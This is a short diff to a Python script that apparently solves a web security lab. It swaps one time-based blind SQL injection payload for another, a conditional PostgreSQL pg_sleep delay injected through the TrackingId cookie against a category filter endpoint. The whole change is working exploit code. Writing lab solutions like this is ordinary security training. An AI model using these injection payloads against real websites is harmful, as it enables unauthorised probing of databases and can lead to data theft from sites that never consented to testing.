@@ -58,7 +58,11 @@ def is_solved(url, no_proxy):
     
 def main(args):
     url = normalize_url(args.url)
-    exploit_payload = "xyz'%3b+SELECT+pg_sleep(10)--"
+    #exploit_payload = "xyz'%3b+SELECT+pg_sleep(10)--"
+    # or
+    exploit_payload = "xyz'+||(select case when (1=1) then pg_sleep(10) else null end)--"
+    """ ||(select case when (1=1) then pg_sleep(10) else null end)--"""
+    
     exploit_url = url + "filter?category=Lifestyle"
     cookies = {"TrackingId": exploit_payload}
     
